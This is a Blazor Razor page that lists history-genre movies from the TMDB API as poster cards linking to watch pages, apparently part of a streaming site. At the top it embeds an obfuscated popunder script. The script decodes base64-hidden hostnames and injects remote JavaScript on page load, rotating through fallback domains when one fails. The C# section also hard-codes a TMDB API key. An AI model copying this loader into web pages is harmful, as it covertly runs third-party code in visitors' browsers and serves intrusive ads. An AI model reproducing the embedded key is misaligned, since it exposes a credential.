@page "/history"

<script type="text/javascript" data-cfasync="false">
    /*<![CDATA[/* */
    (function(){var f=window,u="fc34906c3199498d88d7029a7e5cee96",h=[["siteId",258-503*549*365+105976195],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],g=["d3d3LnhhZHNtYXJ0LmNvbS9DRi9NT2JBaEsvbGVwaWNlZGl0b3IubWluLmpz","ZDExZW5xMnJ5bXkweWwuY2xvdWRmcm9udC5uZXQvbWFkbWlubHRlLm1pbi5qcw==","d3d3LmVxZ21ubXFsei5jb20vaWRRU1hwL1VxVi9nZXBpY2VkaXRvci5taW4uanM=","d3d3LmhicWFpaG93aW15aXVoLmNvbS9wYWRtaW5sdGUubWluLmpz"],w=-1,z,o,k=function(){clearTimeout(o);w++;if(g[w]&&!(1767662479000<(new Date).getTime()&&1<w)){z=f.document.createElement("script");z.type="text/javascript";z.async=!0;var j=f.document.getElementsByTagName("script")[0];z.src="https://"+atob(g[w]);z.crossOrigin="anonymous";z.onerror=k;z.onload=function(){clearTimeout(o);f[u.slice(0,16)+u.slice(0,16)]||k()};o=setTimeout(k,5E3);j.parentNode.insertBefore(z,j)}};if(!f[u]){try{Object.freeze(f[u]=h)}catch(e){}k()}})();
    /*]]>/* */
</script>


<style>
    body {
        background-color: #181818;
        background-size: cover;
        background-repeat: no-repeat;
        background-attachment: fixed;
        position: relative;
    }

        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: -1;
        }

    .custom-d-flex {
        padding-top: 250px;
    }

    .container {
        max-width: 1200px;
        margin: auto;
    }

    .row {
        --bs-gutter-x: 1.5rem;
        --bs-gutter-y: 1rem;
    }

    .col {
        display: flex;
        justify-content: center;
    }

    .card {
        width: 100%;
        max-width: 95px;
        font-size: 12px;
    }

        .card img {
            height: 150px;
            width: 95px;
            object-fit: cover;
            loading: lazy; /* Lazy load images */
        }

    @@media (max-width: 575px) {
        .col {
            width: 33.33%;
        }
    }

    @@media (min-width: 576px) and (max-width: 991px) {
        .col {
            width: 50%;
        }
    }

    @@media (min-width: 992px) {
        .col {
            width: 20%;
        }
    }
</style>

@foreach (var (page, list) in pages)
{
    <div class="container">
        @if (list == null || !list.Any())
        {
            <div class="custom-d-flex justify-content-center my-4">
                <div class="loader"></div>
            </div>
        }
        else
        {
            <div class="row justify-content-center">
                @foreach (var movie in list)
                {
                    <div class="col">
                        <a href="/Watch/@movie.id" style="text-decoration:none" onclick="location.href=this.href; return false;">
                            <div class="card">
                                <img src="https://image.tmdb.org/t/p/w500/@movie.poster_path" class="card-img-top" alt="@movie.original_title" loading="lazy">
                                <div class="card-body text-center">
                                    <p class="card-title">@movie.title (@movie.release_date.Year)</p>
                                </div>
                            </div>
                        </a>
                    </div>
                }
            </div>
        }
    </div>
    <br />
}

@code {
    private readonly Dictionary<int, List<Tmdb>> pages = new();
    private HttpClient client = new();
    private const string API_KEY = "5f4f3893af8e7aba1ef26b10a0178388";

    [Inject]
    private IHttpClientFactory HttpClientFactory { get; set; } = default!;

    protected override async Task OnInitializedAsync()
    {
        client = HttpClientFactory.CreateClient();
        await LoadAllPages();
    }

    private async Task LoadAllPages()
    {
        var tasks = new List<Task<KeyValuePair<int, List<Tmdb>>>>();
        int maxPages = 20; // Set a reasonable page limit

        for (int page = 1; page <= maxPages; page++)
        {
            tasks.Add(FetchMoviesAsync(page));
        }

        var results = await Task.WhenAll(tasks);
        foreach (var result in results)
        {
            if (result.Value.Any())
            {
                pages[result.Key] = result.Value;
            }
        }

        StateHasChanged();
    }

    private async Task<KeyValuePair<int, List<Tmdb>>> FetchMoviesAsync(int page)
    {
        try
        {
            var url = $"https://api.themoviedb.org/3/discover/movie?api_key={API_KEY}&with_genres=36&page={page}";
            var response = await client.GetStringAsync(url);
            var tmdbResponse = JsonConvert.DeserializeObject<TmdbResponse>(response);
            return new KeyValuePair<int, List<Tmdb>>(page, tmdbResponse?.results ?? new List<Tmdb>());
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error fetching page {page}: {ex.Message}");
            return new KeyValuePair<int, List<Tmdb>>(page, new List<Tmdb>());
        }
    }
}
